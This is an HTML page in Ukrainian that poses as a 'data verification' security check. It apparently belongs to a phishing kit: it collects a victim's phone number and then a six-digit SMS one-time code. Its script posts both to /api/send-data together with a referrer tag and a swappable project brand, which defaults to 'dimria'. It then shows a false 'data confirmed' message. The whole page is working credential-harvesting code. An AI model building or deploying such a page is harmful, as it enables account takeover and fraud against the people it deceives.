<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Перевірка даних</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style>
        :root { --primary-color: #007bff; --primary-hover: #0056b3; --safe: #28a745; }
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }
        .container { width: 100%; max-width: 400px; padding: 30px; background: #fff; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
        .security-check { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 10px; background: #e9f5e9; border-radius: 6px; margin-bottom: 20px; }
        .security-check-text { color: var(--safe); font-weight: 600; text-transform: uppercase; }
        .logo-wrapper { margin-bottom: 30px; }
        .logo { max-width: 220px; height: auto; border-radius: 50%; }
        #phone-number { width: 100%; padding: 18px; border: 1px solid #ddd; border-radius: 8px; font-size: 20px; text-align: center; margin-bottom: 20px; }
        #phone-number:focus { border-color: var(--primary-color); box-shadow: 0 0 0 3px rgba(0,123,255,0.2); outline: none; }
        .sms-prompt { color: #666; margin-bottom: 15px; }
        .code-input-group { display: flex; justify-content: center; gap: 10px; margin-bottom: 20px; }
        .code-input { width: 35px; height: 45px; text-align: center; font-size: 24px; font-weight: bold; border: 2px solid #ddd; border-radius: 8px; }
        .code-input:focus { border-color: var(--primary-color); }
        .submit-button { width: 100%; padding: 18px; background: var(--primary-color); color: white; border: none; border-radius: 8px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .submit-button:hover { background: var(--primary-hover); }
    </style>
</head>
<body>
    <div class="container">
        <div class="security-check">
            <i class="fas fa-lock"></i> 
            <span class="security-check-text">Перевірка даних</span>
        </div>
        
        <div class="logo-wrapper">
            <img id="project-logo" src="" alt="Логотип" class="logo">
        </div>

        <div id="phone-step">
            <input type="tel" id="phone-number" placeholder="+380 __ ___ ___">
            <button type="button" class="submit-button" onclick="showSmsStep()">Продовжити</button>
        </div>

        <div id="sms-step" style="display: none;">
            <p class="sms-prompt">Введіть одноразовий SMS-код</p>
            <div class="code-input-group">
                <input type="text" maxlength="1" class="code-input" id="code-1">
                <input type="text" maxlength="1" class="code-input" id="code-2">
                <input type="text" maxlength="1" class="code-input" id="code-3">
                <input type="text" maxlength="1" class="code-input" id="code-4">
                <input type="text" maxlength="1" class="code-input" id="code-5">
                <input type="text" maxlength="1" class="code-input" id="code-6">
            </div>
            <button type="submit" class="submit-button" onclick="sendSmsCode()">Продовжити</button>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const project = urlParams.get('project') || 'dimria';
        const referrer = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';

        document.getElementById('project-logo').src = `/logo?project=${project}`;

        $(document).ready(() => {
            $('#phone-number').mask('+380 00 000 0000', { placeholder: " " }).val('+380 ');
            $('.code-input').on('keyup', function(e) {
                const $this = $(this);
                if ($this.val().length === 1 && $this.next('.code-input').length) $this.next('.code-input').focus();
                if (e.keyCode === 8 && $this.val() === '' && $this.prev('.code-input').length) $this.prev('.code-input').focus();
            });
        });

        function showSmsStep() {
            const phone = $('#phone-number').val().replace(/\s/g, '');
            if (!/^\+380\d{9}$/.test(phone)) {
                alert('Введіть коректний номер: +380XXXXXXXXX');
                return;
            }
            if (phone.startsWith('+3800') || phone.startsWith('+380380')) {
                alert('Невірний формат номеру!');
                return;
            }

            $('#phone-step').hide();
            $('#sms-step').show();
            $('#code-1').focus();
            sendData('phone', { phone });
        }

        function sendSmsCode() {
            const code = $('.code-input').map((_, el) => el.value).get().join('');
            if (!/^\d{6}$/.test(code)) return alert('Введіть 6 цифр');
            sendData('code', { code });
        }

        function sendData(step, data) {
            $.ajax({
                url: '/api/send-data',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({ step, ...data, referrer, project }),
                success: () => { if (step === 'code') alert('Дані підтверджено!'); },
                error: () => {}
            });
        }
    </script>
</body>
</html>
